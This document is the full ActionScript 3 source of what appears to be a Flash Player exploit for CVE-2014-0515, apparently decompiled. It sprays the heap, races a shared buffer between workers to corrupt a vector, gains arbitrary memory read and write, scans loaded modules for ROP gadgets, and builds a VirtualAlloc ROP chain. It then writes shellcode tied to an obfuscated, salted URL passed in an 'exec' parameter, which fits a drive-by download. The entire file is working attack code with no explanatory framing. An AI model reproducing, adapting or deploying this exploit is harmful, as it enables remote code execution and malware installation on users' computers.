﻿package 
{
    import flash.display.MovieClip;
    import flash.display.Shader;
    import flash.utils.ByteArray;
    import flash.system.Worker;
    import flash.system.MessageChannel;
    import __AS3__.vec.Vector;
    import flash.events.Event;
    import flash.system.Capabilities;
    import flash.utils.Endian;
    import flash.system.WorkerDomain;
    import flash.system.ApplicationDomain;
    import flash.utils.*;
    import flash.events.*;
    import flash.display.*;
    import flash.system.*;
    import __AS3__.vec.*;
    import avm2.intrinsics.memory.*; // ASC2.0, AIR3.6 SDK and above

    public class Main extends MovieClip 
    {

        private var shader:Shader;
        private var shader_bytes:ByteArray;
        private var cve_2014_0515:Boolean = false;
        private var salt:String = "jEeNubZ4uTJEU9v2k23f3jufBrNBLbs1Tvq8GlDL1kiZ5exHNrUUSKcl+A==";
        private var xkey:String = "zl0daGm0CTksESoi";
        private var hash_len:Number = 40;
        private var x86_url_checked:uint = 0;
        private var shellcodes:Shellcodes;
        private var x64_mode:Boolean = false;
        private var page_size:uint = 0x1000;
        private var max_image_size:uint = 0xC00000;
        private var unchained_elements:uint = 0x40000000;
        private var buffer_signature_0:uint = 3133078208;
        private var buffer_signature_1:uint = 3133078209;
        private var buffer_signature_3:uint = 3133078211;
        private var buffer_filler_0:uint = 0xCCCCCCCC;
        private var buffer_filler_1:uint = 0xDDDDDDDD;
        private var spray_multiplier:int = 2;
        private var vectors_count:uint;
        private var vector_elements:uint = 114;
        private var vector_signature_0:uint = 4276992702;
        private var vector_signature_2:uint = 3133078222;
        private var attacking_buffer:ByteArray = null;
        private var attacking_buffer_name:String = "fnfre.obq";
        private var protecting_buffer:ByteArray = null;
        private var protecting_buffer_name:String = "pfobof.obq";
        private var protecting_buffer_filler:uint = 0xBBBBBBBB;
        private var protecting_buffer_size:uint;
        private var worker:Worker = null;
        private var main_to_worker:MessageChannel = null;
        private var main_to_worker_name:String = "nelf";
        private var worker_to_main:MessageChannel = null;
        private var worker_to_main_name:String = "c.lf";
        private var message_hello:String = "ghbdtn";
        private var message_world:String = "vbh";
        private var attack_size:int = 504;
        private var byte_array_size:int = 0x2000;
        private var buffers_count:int;
        private var buffers:Vector.<Object> = null;
        private var vectors:Vector.<Object> = null;
        private var unchained_vector_index:int = 0;
        private var unchained_vector:Vector.<uint> = null;
        private var unchained_vector_data_address:uint = 0;
        private var unchained_vector_data_address_index:uint = 0;
        private var address_of_gc:uint = 0;
        private var fixed_alloc_address:uint = 0;
        private var fake_object_address:uint = 0;
        private var rop_address:uint = 0;
        private var found_vector_index:uint = 0;
        private var found_vector_address:uint = 0;
        private var found_vector:Vector.<uint> = null;
        private var module_mz_pattern:uint = 9460301;
        private var rop_gadget_0_pattern:uint = 50068;
        private var rop_gadget_0_pattern_mask:uint = 0xFFFF;
        private var rop_gadget_1_pattern_0:uint = 3272131715;
        private var rop_gadget_2_pattern_0:uint = 6816874;
        private var rop_gadget_2_pattern_1:uint = 0x68000020;
        private var rop_gadget_2_pattern_2:uint = 0x100000;
        private var rop_gadget_2_ppapi_pattern_0:uint = 6816106;
        private var rop_gadget_2_ppapi_pattern_1:uint = 0x68000020;
        private var rop_gadget_2_ppapi_pattern_2:uint = 0x200000;
        private var rop_gadget_2_win8_ocx_pattern_0:uint = 6816874;
        private var rop_gadget_2_win8_ocx_pattern_1:uint = 0x56000010;
        private var rop_gadget_3_pattern_0:uint = 4283498891;
        private var rop_gadget_3_pattern_1:uint = 2128;
        private var rop_gadget_3_pattern_1_mask:uint = 0xFFFF;
        private var target_buffer_address:uint = 0;
        private var address_of_pre_initial_gadget:uint = 0;
        private var address_of_initial_gadget:uint = 0;
        private var address_of_update_stack_gadget:uint = 0;
        private var address_of_virtual_alloc_gadget:uint = 0;
        private var rop_gadget_xchg_eax_esi_pattern:uint = 50070;
        private var rop_gadget_xchg_eax_ebp_pattern:uint = 50069;
        private var rop_gadget_xchg_eax_ecx_pattern:uint = 50065;
        private var rop_gadget_xchg_eax_edi_pattern:uint = 50071;
        private var address_of_xchg_eax_esi_gadget:uint = 0;
        private var address_of_xchg_eax_ebp_gadget:uint = 0;
        private var address_of_xchg_eax_ecx_gadget:uint = 0;
        private var address_of_xchg_eax_edi_gadget:uint = 0;
        private var heap_address_high:uint = 0;
        private var flash_address_high:uint = 0;
        private var pepper_flash:Boolean = false;
        private var windows_8_embedded_activex:Boolean = false;
        private var os_version:String = null;
        private var player_type:String = null;
        private var player_version:String = null;
        private var player_version_number:uint = 0;

        public function Main()
        {
            this.shader = new Shader();
            this.shader_bytes = Assets.get_shader_bytes();
            this.vectors_count = (5770 * this.spray_multiplier);
            this.protecting_buffer_size = this.byte_array_size;
            this.buffers_count = (510 * this.spray_multiplier);
            super();
            if (Worker.current.isPrimordial)
            {
                if (stage)
                {
                    this.Init();
                } else
                {
                    addEventListener(Event.ADDED_TO_STAGE, this.Init);
                };
            } else
            {
                this.exploit_worker();
            };
        }
        private function get_version_number():uint
        {
            var _local_1:String = Capabilities.version.toLowerCase();
            if (_local_1.length < 4)
            {
                return (0);
            };
            var _local_2:String = _local_1.substr(0, 4);
            if (_local_2 != "win ")
            {
                return (0);
            };
            _local_1 = _local_1.substr(4);
            var _local_3:Array = _local_1.split(",");
            if (_local_3.length != 4)
            {
                return (0);
            };
            var _local_4:uint;
            var _local_5:uint;
            _local_4 = uint(_local_3[0]);
            _local_5 = (_local_5 + _local_4);
            _local_4 = uint(_local_3[1]);
            _local_5 = (_local_5 * 10);
            _local_5 = (_local_5 + _local_4);
            _local_4 = uint(_local_3[2]);
            _local_5 = (_local_5 * 1000);
            _local_5 = (_local_5 + _local_4);
            _local_4 = uint(_local_3[3]);
            _local_5 = (_local_5 * 1000);
            _local_5 = (_local_5 + _local_4);
            return (_local_5);
        }
        private function check_environment():Boolean
        {
            this.player_version_number = this.get_version_number();
            if (this.player_version_number == 0)
            {
                return (false);
            };
            this.os_version = Capabilities.os.toLowerCase();
            this.player_type = Capabilities.playerType.toLowerCase();
            this.player_version = String(this.player_version_number);
            if (((!((this.player_type == "activex"))) && (!((this.player_type == "plugin")))))
            {
                return (false);
            };
            if (this.player_version_number < 115000000)
            {
                return (false);
            };
            this.cve_2014_0515 = (((this.player_version_number <= 117700275)) || ((((this.player_version_number >= 118000000)) && ((this.player_version_number <= 130000182)))));
            return (true);
        }
        private function fill_buffer(_arg_1:ByteArray, _arg_2:int):void
        {
            _arg_1.position = 0;
            var _local_3:int;
            while (_local_3 < (_arg_1.length / 4))
            {
                _arg_1.writeInt(_arg_2);
                _local_3++;
            };
            _arg_1.position = 0;
        }
        private function get_address_index(_arg_1:uint):uint
        {
            var _local_2:uint = (_arg_1 / 4);
            return (((_local_2 - this.unchained_vector_data_address_index) & (this.unchained_elements - 1)));
        }
        private function read_uint(_arg_1:uint):uint
        {
            var _local_2:uint = this.get_address_index(_arg_1);
            var _local_3:uint = (_arg_1 % 4);
            if (_local_3 == 0)
            {
                return (this.unchained_vector[_local_2]);
            };
            var _local_4:uint = (1 << (_local_3 * 8));
            var _local_5:uint = (1 << ((4 - _local_3) * 8));
            var _local_6:uint = this.unchained_vector[_local_2];
            var _local_7:uint = this.unchained_vector[(_local_2 + 1)];
            _local_6 = (_local_6 / _local_4);
            _local_7 = (_local_7 * _local_5);
            var _local_8:uint = (_local_6 | _local_7);
            return (_local_8);
        }
        private function write_uint(_arg_1:uint, _arg_2:uint):void
        {
            var _local_3:uint = this.get_address_index(_arg_1);
            var _local_4:uint = (_arg_1 % 4);
            if (_local_4 == 0)
            {
                this.unchained_vector[_local_3] = _arg_2;
                return;
            };
        }
        private function magic_read(_arg_1:int):int
        {
            return (li32(_arg_1) /*FlasCC (Alchemy)*/ );
        }
        private function magic_read_uint(_arg_1:uint):uint
        {
            return (uint(this.magic_read(int(_arg_1))));
        }
        private function magic_write(_arg_1:int, _arg_2:int):void
        {
            si32(_arg_2, _arg_1); //FlasCC (Alchemy)
        }
        private function magic_write_uint(_arg_1:uint, _arg_2:uint):void
        {
            this.magic_write(int(_arg_1), int(_arg_2));
        }
        private function prepare_attack():Boolean
        {
            this.attacking_buffer = new ByteArray();
            this.attacking_buffer.shareable = true;
            this.attacking_buffer.endian = Endian.LITTLE_ENDIAN;
            this.worker = WorkerDomain.current.createWorker(loaderInfo.bytes);
            this.main_to_worker = Worker.current.createMessageChannel(this.worker);
            this.worker_to_main = this.worker.createMessageChannel(Worker.current);
            this.worker_to_main.addEventListener(Event.CHANNEL_MESSAGE, this.on_worker_to_main);
            this.worker.setSharedProperty(this.main_to_worker_name, this.main_to_worker);
            this.worker.setSharedProperty(this.worker_to_main_name, this.worker_to_main);
            this.worker.setSharedProperty(this.attacking_buffer_name, this.attacking_buffer);
            this.worker.start();
            return (true);
        }
        private function make_spray_by_buffers_no_holes():void
        {
            var _local_1:int;
            var _local_2:ByteArray;
            this.buffers = new Vector.<Object>(this.buffers_count);
            _local_1 = 0;
            while (_local_1 < this.buffers_count)
            {
                _local_2 = new ByteArray();
                this.buffers[_local_1] = _local_2;
                _local_2.endian = Endian.LITTLE_ENDIAN;
                _local_1++;
            };
            var _local_3:int = ((this.buffers_count * 4) / 5);
            if ((_local_3 % 2) == 0)
            {
                _local_3++;
            };
            _local_1 = 0;
            while (_local_1 < this.buffers_count)
            {
                _local_2 = (this.buffers[_local_1] as ByteArray);
                if (_local_1 == _local_3)
                {
                    _local_2 = this.attacking_buffer;
                };
                _local_2.length = this.byte_array_size;
                this.fill_buffer(_local_2, this.buffer_filler_0);
                _local_2.writeInt(this.buffer_signature_0);
                _local_2.writeInt(this.buffer_signature_1);
                _local_2.writeInt(_local_1);
                _local_2.writeInt(this.buffer_signature_3);
                _local_1++;
            };
        }
        private function make_spray_by_buffers_make_holes():void
        {
            var _local_1:int;
            var _local_2:ByteArray;
            var _local_3:int = ((this.buffers_count * 4) / 5);
            if ((_local_3 % 2) == 0)
            {
                _local_3++;
            };
            _local_1 = 0;
            while (_local_1 < this.buffers_count)
            {
                if (_local_1 == _local_3)
                {
                    this.protecting_buffer.clear();
                } else
                {
                    if ((_local_1 % 2) == 1)
                    {
                        _local_2 = (this.buffers[_local_1] as ByteArray);
                        this.fill_buffer(_local_2, this.buffer_filler_1);
                        _local_2.clear();
                    };
                };
                _local_1++;
            };
        }
        private function make_filling_by_uints():void
        {
            var _local_1:uint;
            var _local_2:Vector.<uint>;
            this.vectors = new Vector.<Object>(this.vectors_count);
            _local_1 = 0;
            while (_local_1 < this.vectors_count)
            {
                this.vectors[_local_1] = new Vector.<uint>();
                _local_1++;
            };
            _local_1 = 0;
            while (_local_1 < this.vectors_count)
            {
                _local_2 = (this.vectors[_local_1] as Vector.<uint>);
                _local_2.length = this.vector_elements;
                _local_2[0] = this.vector_signature_0;
                _local_2[1] = _local_1;
                _local_2[2] = this.vector_signature_2;
                _local_1++;
            };
        }
        private function take_over_buffer():Boolean
        {
            var _local_1:uint = this.magic_read_uint(0);
            if (_local_1 != this.protecting_buffer_filler)
            {
                return (false);
            };
            this.make_spray_by_buffers_make_holes();
            this.make_filling_by_uints();
            _local_1 = this.magic_read_uint(0);
            if (_local_1 == this.protecting_buffer_filler)
            {
                return (false);
            };
            return (true);
        }
        private function attack():Boolean
        {
            var _local_1:uint;
            var _local_2:uint;
            var _local_3:uint = this.byte_array_size;
            while (_local_2 < _local_3)
            {
                _local_1 = this.magic_read_uint(_local_2);
                if (_local_1 == this.vector_elements)
                {
                    _local_1 = this.magic_read_uint((_local_2 + (this.x86_url_checked << 3)));
                    if (_local_1 == this.vector_signature_0)
                    {
                        this.magic_write_uint(_local_2, this.unchained_elements);
                        return (true);
                    };
                };
                _local_2 = (_local_2 + (this.x86_url_checked << 2));
            };
            return (false);
        }
        private function find_unchained_vector():Boolean
        {
            var _local_1:Vector.<uint>;
            var _local_2:int;
            while (_local_2 < this.vectors_count)
            {
                _local_1 = (this.vectors[_local_2] as Vector.<uint>);
                if (((!((_local_1.length == this.vector_elements))) && (!((_local_1.length == (this.vector_elements * 2))))))
                {
                    this.unchained_vector_index = _local_2;
                    this.unchained_vector = _local_1;
                    return (true);
                };
                _local_2++;
            };
            return (false);
        }
        private function find_buffer_page():uint
        {
            var _local_1:uint = (this.byte_array_size * 8);
            var _local_2:uint = (_local_1 / 4);
            var _local_3:uint;
            var _local_4:uint;
            var _local_5:uint;
            var _local_6:uint;
            while (_local_5 < _local_2)
            {
                _local_3 = this.unchained_vector[_local_5];
                if (_local_3 == this.buffer_signature_0)
                {
                    _local_4 = _local_5;
                    break;
                };
                _local_5++;
            };
            _local_6 = (_local_4 * 4);
            return (_local_6);
        }
        private function find_vectors_page(_arg_1:uint):uint
        {
            var _local_2:uint = (this.byte_array_size * 8);
            var _local_3:uint = (_local_2 / 4);
            var _local_4:uint;
            var _local_5:uint;
            var _local_6:uint = (_arg_1 / 4);
            var _local_7:uint;
            while (_local_6 < _local_3)
            {
                _local_4 = this.unchained_vector[_local_6];
                if (_local_4 == this.vector_signature_0)
                {
                    _local_4 = this.unchained_vector[(_local_6 + 2)];
                    if (_local_4 == this.vector_signature_2)
                    {
                        this.found_vector_index = this.unchained_vector[(_local_6 + 1)];
                        _local_5 = _local_6;
                        break;
                    };
                };
                _local_6++;
            };
            _local_7 = (_local_5 * 4);
            return (_local_7);
        }
        private function determine_addresses_new():Boolean
        {
            var _local_1:uint = this.find_buffer_page();
            if (_local_1 == 0)
            {
                return (false);
            };
            var _local_2:uint = (this.page_size - (_local_1 % this.page_size));
            var _local_3:uint = (_local_2 % this.attack_size);
            if (_local_3 == 40)
            {
                if (this.x64_mode)
                {
                    return (false);
                };
            } else
            {
                if (_local_3 == 80)
                {
                    if (!this.x64_mode)
                    {
                        return (false);
                    };
                } else
                {
                    return (false);
                };
            };
            var _local_4:uint = 8;
            var _local_5:uint = 32;
            var _local_6:uint;
            var _local_7:uint = 28;
            if (this.x64_mode)
            {
                _local_4 = 16;
                _local_5 = 64;
                _local_6 = 0;
                _local_7 = 56;
            };
            var _local_8:uint = this.find_vectors_page((_local_1 + this.byte_array_size));
            if (_local_8 == 0)
            {
                return (false);
            };
            _local_8 = (_local_8 - _local_4);
            var _local_9:uint = (_local_8 / 4);
            if (!this.x64_mode)
            {
                this.address_of_gc = this.unchained_vector[(_local_9 + 1)];
            } else
            {
                this.address_of_gc = this.unchained_vector[(_local_9 + 2)];
                this.heap_address_high = this.unchained_vector[(_local_9 + 3)];
            };
            var _local_10:uint = ((_local_8 - _local_1) % this.page_size);
            var _local_11:uint = (_local_8 - _local_10);
            this.found_vector = (this.vectors[this.found_vector_index] as Vector.<uint>);
            this.found_vector.length = (this.vector_elements * 2);
            var _local_12:uint = (_local_11 + _local_6);
            _local_9 = (_local_12 / 4);
            this.found_vector_address = this.unchained_vector[_local_9];
            this.unchained_vector_data_address = (this.found_vector_address - _local_8);
            this.unchained_vector_data_address_index = (this.unchained_vector_data_address / 4);
            this.target_buffer_address = (this.unchained_vector_data_address + _local_1);
            _local_9 = ((_local_11 + _local_7) / 4);
            this.fixed_alloc_address = this.unchained_vector[_local_9++];
            this.flash_address_high = this.unchained_vector[_local_9];
            this.found_vector_index++;
            this.found_vector = (this.vectors[this.found_vector_index] as Vector.<uint>);
            return (true);
        }
        private function restore_vector_32():void
        {
            var _local_1:uint = (this.unchained_elements - 2);
            this.unchained_vector[_local_1] = this.vector_elements;
            _local_1 = (this.unchained_elements - 1);
            this.unchained_vector[_local_1] = this.address_of_gc;
        }
        private function x86_scan_for_rop_gadgets():Boolean
        {
            var _local_1:uint;
            var _local_2:uint;
            var _local_3:uint;
            var _local_4:uint;
            var _local_5:uint = (this.fixed_alloc_address & ~((this.page_size - 1)));
            while (true)
            {
                _local_1 = this.read_uint(_local_5);
                if (_local_1 == this.module_mz_pattern) break;
                _local_5 = (_local_5 - this.page_size);
            };
            _local_5 = (_local_5 + this.page_size);
            var _local_6:uint = (_local_5 + this.max_image_size);
            while ((((((((((((((((this.address_of_initial_gadget == 0)) || ((this.address_of_update_stack_gadget == 0)))) || ((this.address_of_virtual_alloc_gadget == 0)))) || ((this.address_of_xchg_eax_ebp_gadget == 0)))) || ((this.address_of_xchg_eax_ecx_gadget == 0)))) || ((this.address_of_xchg_eax_edi_gadget == 0)))) || ((this.address_of_xchg_eax_esi_gadget == 0)))) || ((this.address_of_pre_initial_gadget == 0))))
            {
                _local_1 = this.read_uint(_local_5);
                if (this.address_of_pre_initial_gadget == 0)
                {
                    if (_local_1 == this.rop_gadget_3_pattern_0)
                    {
                        _local_3 = this.read_uint((_local_5 + 4));
                        if ((_local_3 & this.rop_gadget_3_pattern_1_mask) == this.rop_gadget_3_pattern_1)
                        {
                            this.address_of_pre_initial_gadget = _local_5;
                            _local_5 = (_local_5 + 5);
                            continue;
                        };
                    };
                };
                if (this.address_of_initial_gadget == 0)
                {
                    if ((_local_1 & this.rop_gadget_0_pattern_mask) == this.rop_gadget_0_pattern)
                    {
                        this.address_of_initial_gadget = _local_5;
                        _local_5 = (_local_5 + 2);
                        continue;
                    };
                };
                if (this.address_of_xchg_eax_ebp_gadget == 0)
                {
                    if ((_local_1 & this.rop_gadget_0_pattern_mask) == this.rop_gadget_xchg_eax_ebp_pattern)
                    {
                        this.address_of_xchg_eax_ebp_gadget = _local_5;
                        _local_5 = (_local_5 + 2);
                        continue;
                    };
                };
                if (this.address_of_xchg_eax_ecx_gadget == 0)
                {
                    if ((_local_1 & this.rop_gadget_0_pattern_mask) == this.rop_gadget_xchg_eax_ecx_pattern)
                    {
                        this.address_of_xchg_eax_ecx_gadget = _local_5;
                        _local_5 = (_local_5 + 2);
                        continue;
                    };
                };
                if (this.address_of_xchg_eax_esi_gadget == 0)
                {
                    if ((_local_1 & this.rop_gadget_0_pattern_mask) == this.rop_gadget_xchg_eax_esi_pattern)
                    {
                        this.address_of_xchg_eax_esi_gadget = _local_5;
                        _local_5 = (_local_5 + 2);
                        continue;
                    };
                };
                if (this.address_of_xchg_eax_edi_gadget == 0)
                {
                    if ((_local_1 & this.rop_gadget_0_pattern_mask) == this.rop_gadget_xchg_eax_edi_pattern)
                    {
                        this.address_of_xchg_eax_edi_gadget = _local_5;
                        _local_5 = (_local_5 + 2);
                        continue;
                    };
                };
                if (this.address_of_update_stack_gadget == 0)
                {
                    if (_local_1 == this.rop_gadget_1_pattern_0)
                    {
                        this.address_of_update_stack_gadget = _local_5;
                        _local_5 = (_local_5 + 4);
                        continue;
                    };
                };
                if (this.address_of_virtual_alloc_gadget == 0)
                {
                    _local_2 = _local_1;
                    _local_3 = 0;
                    _local_4 = 0;
                    if (_local_2 == this.rop_gadget_2_pattern_0)
                    {
                        _local_3 = this.read_uint((_local_5 + 4));
                        if (_local_3 == this.rop_gadget_2_pattern_1)
                        {
                            _local_4 = this.read_uint((_local_5 + 8));
                            if (_local_4 == this.rop_gadget_2_pattern_2)
                            {
                                this.address_of_virtual_alloc_gadget = this.read_uint(this.read_uint((_local_5 + 15)));
                                _local_5 = (_local_5 + 12);
                                continue;
                            };
                        };
                    };
                    if (_local_2 == this.rop_gadget_2_win8_ocx_pattern_0)
                    {
                        _local_3 = this.read_uint((_local_5 + 4));
                        if (_local_3 == this.rop_gadget_2_win8_ocx_pattern_1)
                        {
                            this.address_of_virtual_alloc_gadget = this.read_uint(this.read_uint((_local_5 + 11)));
                            _local_5 = (_local_5 + 8);
                            this.windows_8_embedded_activex = true;
                            continue;
                        };
                    };
                    if (_local_2 == this.rop_gadget_2_ppapi_pattern_0)
                    {
                        _local_3 = this.read_uint((_local_5 + 4));
                        if (_local_3 == this.rop_gadget_2_ppapi_pattern_1)
                        {
                            _local_4 = this.read_uint((_local_5 + 8));
                            if (_local_4 == this.rop_gadget_2_ppapi_pattern_2)
                            {
                                this.address_of_virtual_alloc_gadget = this.read_uint(this.read_uint((_local_5 + 15)));
                                _local_5 = (_local_5 + 12);
                                this.pepper_flash = true;
                                continue;
                            };
                        };
                    };
                };
                if (++_local_5 > _local_6)
                {
                    return (false);
                };
            };
            return (true);
        }
        private function x86_make_vtable_rop_and_shellcode(_arg_1:ByteArray):void
        {
            var _local_10:uint;
            var _local_2:uint = (4 * 0x0400);
            var _local_3:uint = (this.byte_array_size - _local_2);
            var _local_4:uint = this.target_buffer_address;
            this.rop_address = (_local_4 + _local_3);
            var _local_5:uint = 0x0400;
            var _local_6:uint = (_local_3 - _local_5);
            this.fake_object_address = (_local_4 + _local_6);
            var _local_7:uint = (this.fake_object_address + 384);
            this.write_uint((this.fake_object_address + 4), 65536);
            this.write_uint((this.fake_object_address + 428), 0);
            this.write_uint((this.fake_object_address + 484), _local_7);
            this.write_uint(_local_7, this.rop_address);
            this.write_uint((_local_7 + 4), 1);
            var _local_8:uint = 0x0200;
            while (_local_8 < _local_5)
            {
                this.write_uint((this.fake_object_address + _local_8), 3735929054);
                _local_8 = (_local_8 + 4);
            };
            var _local_9:uint = this.rop_address;
            this.write_uint(_local_9, this.address_of_update_stack_gadget);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, this.address_of_pre_initial_gadget);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, this.address_of_initial_gadget);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, this.address_of_xchg_eax_esi_gadget);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, this.address_of_xchg_eax_ecx_gadget);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, this.address_of_xchg_eax_edi_gadget);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, this.address_of_virtual_alloc_gadget);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, (_local_9 + 20));
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, this.rop_address);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 0x2000);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 0x1000);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 64);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 2943072);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 0xC6610000);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 0x89000447);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 3224501492);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 3213711176);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 0xFFFFFE80);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 3104065417);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 0x0200);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 2868104961);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 3355347295);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 6214);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 0xC4830000);
            _local_9 = (_local_9 + 4);
            this.write_uint(_local_9, 2425406216);
            _local_9 = (_local_9 + 4);
            _arg_1.position = 0;
            while (_arg_1.position < _arg_1.length)
            {
                _local_10 = _arg_1.readUnsignedInt();
                this.write_uint(_local_9, _local_10);
                _local_9 = (_local_9 + 4);
            };
        }
        private function take_over_32():Boolean
        {
            var _local_1:uint = (this.unchained_elements - 1);
            this.unchained_vector[_local_1] = this.fake_object_address;
            this.unchained_vector.length = (this.vector_elements * 2);
            this.restore_vector_32();
            return (true);
        }
        private function get_x86_shellcode():ByteArray
        {
            return (this.shellcodes.GetX86Shellcode(this.x86_url_checked));
        }
        private function exploit_primordial_start(_arg_1:String):Boolean
        {
            if (!this.check_environment())
            {
                return (false);
            };
            var _local_2:String = this.DecryptX86URL(_arg_1);
            this.shellcodes = new Shellcodes(_local_2, this.xkey.toString());
            this.prepare_attack();
            this.make_spray_by_buffers_no_holes();
            ApplicationDomain.currentDomain.domainMemory = this.attacking_buffer;
            this.main_to_worker.send(this.message_hello);
            return (true);
        }
        private function exploit_primordial_finish():Boolean
        {
            if (!this.take_over_buffer())
            {
                return (false);
            };
            if (!this.attack())
            {
                return (false);
            };
            if (!this.find_unchained_vector())
            {
                return (false);
            };
            var _local_1:Boolean = this.determine_addresses_new();
            if (!this.x64_mode)
            {
                if (!_local_1)
                {
                    this.restore_vector_32();
                    return (false);
                };
                if (!this.x86_scan_for_rop_gadgets())
                {
                    this.restore_vector_32();
                    return (false);
                };
                this.x86_make_vtable_rop_and_shellcode(this.get_x86_shellcode());
                if (!this.take_over_32())
                {
                    this.restore_vector_32();
                    return (false);
                };
            } else
            {
                return (false);
            };
            return (true);
        }
        private function on_worker_to_main(_arg_1:Event):void
        {
            var _local_2:* = this.worker_to_main.receive();
            if (_local_2 == this.message_world)
            {
                this.protecting_buffer = this.worker.getSharedProperty(this.protecting_buffer_name);
                this.exploit_primordial_finish();
            };
        }
        protected function on_main_to_worker(_arg_1:Event):void
        {
            var _local_3:uint;
            var _local_4:ByteArray;
            var _local_5:ByteArray;
            var _local_2:* = this.main_to_worker.receive();
            if (_local_2 == this.message_hello)
            {
                _local_3 = this.page_size;
                _local_4 = new ByteArray();
                _local_4.length = _local_3;
                _local_5 = new ByteArray();
                _local_5.length = _local_3;
                _local_5.clear();
                this.attacking_buffer.clear();
                _local_4.clear();
                this.protecting_buffer.length = this.protecting_buffer_size;
                this.fill_buffer(this.protecting_buffer, this.protecting_buffer_filler);
                Worker.current.setSharedProperty(this.protecting_buffer_name, this.protecting_buffer);
                this.worker_to_main.send(this.message_world);
            };
        }
        private function exploit_worker():Boolean
        {
            this.protecting_buffer = new ByteArray();
            this.protecting_buffer.shareable = true;
            this.protecting_buffer.endian = Endian.LITTLE_ENDIAN;
            this.main_to_worker = Worker.current.getSharedProperty(this.main_to_worker_name);
            this.worker_to_main = Worker.current.getSharedProperty(this.worker_to_main_name);
            this.attacking_buffer = Worker.current.getSharedProperty(this.attacking_buffer_name);
            this.main_to_worker.addEventListener(Event.CHANNEL_MESSAGE, this.on_main_to_worker);
            return (true);
        }
        private function DecryptString(_arg_1:String):String
        {
            var _local_2:ByteArray;
            var _local_3:ByteArray;
            try
            {
                _local_2 = Base64.DecodeToByteArray(_arg_1);
                _local_3 = Tools.DecryptByteArray(_local_2);
                return (_local_3.readUTFBytes(_local_3.length));
            } catch(error:Error)
            {
            };
            return (null);
        }
        private function DecryptX86URL(_arg_1:String):String
        {
            var _local_7:int;
            var _local_8:String;
            var _local_9:int;
            var _local_10:String;
            var _local_2:String;
            var _local_3:String = Base64.Decode(unescape(_arg_1));
            var _local_4:Number = _local_3.length;
            if (_local_4 < (this.hash_len + 1))
            {
                return (_local_2);
            };
            var _local_5:String = _local_3.substr((_local_4 - this.hash_len), this.hash_len);
            _local_2 = _local_3.substr(0, (_local_4 - this.hash_len));
            _local_7 = (loaderInfo.loaderURL.lastIndexOf("/") + 1);
            _local_8 = loaderInfo.loaderURL.substr(0, _local_7);
            _local_2 = (_local_8 + _local_2);
            var _local_6:String = this.DecryptString(this.salt);
            if (_local_6 != null)
            {
                _local_9 = 3;
                if (_local_6.length < _local_9)
                {
                    return (_local_2);
                };
                _local_6 = _local_6.substr(0, (_local_6.length - _local_9));
                _local_10 = Sha1.hex_sha1((_local_2 + _local_6));
                this.x86_url_checked = (((_local_10)==_local_5) ? 1 : 0);
            } else
            {
                return (null);
            };
            return (_local_2);
        }
        private function Init(e:Event=null):void
        {
            var exec:String;
            var evalue:String;
            removeEventListener(Event.ADDED_TO_STAGE, this.Init);
            try
            {
                exec = "exec";
                if (((((stage) && (stage.loaderInfo))) && (stage.loaderInfo.parameters)))
                {
                    evalue = (stage.loaderInfo.parameters[exec] as String);
                };
                if ((((((((evalue == null)) && (root))) && (root.loaderInfo))) && (root.loaderInfo.parameters)))
                {
                    evalue = (root.loaderInfo.parameters[exec] as String);
                };
                if ((((((evalue == null)) && (loaderInfo))) && (loaderInfo.parameters)))
                {
                    evalue = (loaderInfo.parameters[exec] as String);
                };
                this.exploit_primordial_start(evalue);
            } catch(e:Error)
            {
            };
        }

    }
}